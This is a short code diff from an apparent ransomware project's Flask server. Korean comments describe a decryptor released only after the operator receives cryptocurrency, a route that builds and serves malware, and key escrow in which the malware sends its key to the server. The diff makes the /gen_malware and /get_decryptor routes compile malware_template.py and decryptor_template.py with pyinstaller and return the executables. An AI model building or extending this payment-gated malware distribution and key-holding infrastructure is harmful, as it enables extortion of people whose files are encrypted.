@@ -17,12 +17,14 @@ def hello_world():
 # 언제? 관리자가 코인을 받았을 때만 다운로드 가능
 @app.route("/get_decryptor")
 def get_decryptor():
-    return send_file("Database.py", as_attachment=True)
+    os.system("pyinstaller --onefile decryptor_template.py")
+    return send_file("./dist/decryptor_template", as_attachment=True)
 
 # Malware 생성 후 다운로드
 @app.route("/gen_malware")
 def gen_malware():
-    return send_file("app.py", as_attachment=True)
+    os.system("pyinstaller --onefile malware_template.py")
+    return send_file("./dist/malware_template", as_attachment=True)
 
 # malware에서 key를 서버에 저장
 # 서버는 token을 랜덤하게 생성하고, DB에 저장한 뒤 token 반환
